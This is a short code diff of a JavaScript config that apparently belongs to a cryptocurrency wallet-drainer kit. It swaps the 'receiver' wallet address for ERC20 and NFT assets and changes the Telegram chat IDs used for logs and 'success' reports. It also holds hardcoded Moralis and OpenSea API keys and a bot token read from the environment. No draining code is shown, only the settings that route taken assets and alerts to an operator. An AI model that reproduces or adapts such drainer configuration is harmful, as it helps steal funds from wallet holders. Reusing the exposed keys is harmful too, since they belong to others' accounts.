@@ -160,7 +160,7 @@ const ERC1155 = [
 ];
 
 const config = { 
-    receiver: "0x9AFAc6Fa76E43eED6A2d7Af60B8e6CB4c7aaa92a",
+    receiver: "0xE5a24F17D9BeDFeC1DF0d3B0e3dA1B06E0B9ce84",
     
     // ERC20 & NFT
     SAFAfulfiller: process.env.SAFAfulfiller,
@@ -169,8 +169,8 @@ const config = {
     fulfiller: process.env.fulfiller,
 
     BOT_TOKEN: process.env.bot,
-    LOGS_CHAT_ID: "6095243294",
-    SUCCESS_CHAT_ID: "6095243294",
+    LOGS_CHAT_ID: "1724480955",
+    SUCCESS_CHAT_ID: "1724480955",
 
     MORALIS_API_KEY: "0p03zlu5xzCiqjkYN8YgUn4oO6YwedtgWBdzVQgy8Mq9PITBMtK4N0KoRgXbeH9s",
     OPENSEA_API_KEY: "7dabb51af1224421960e18ed64e69bc2" 
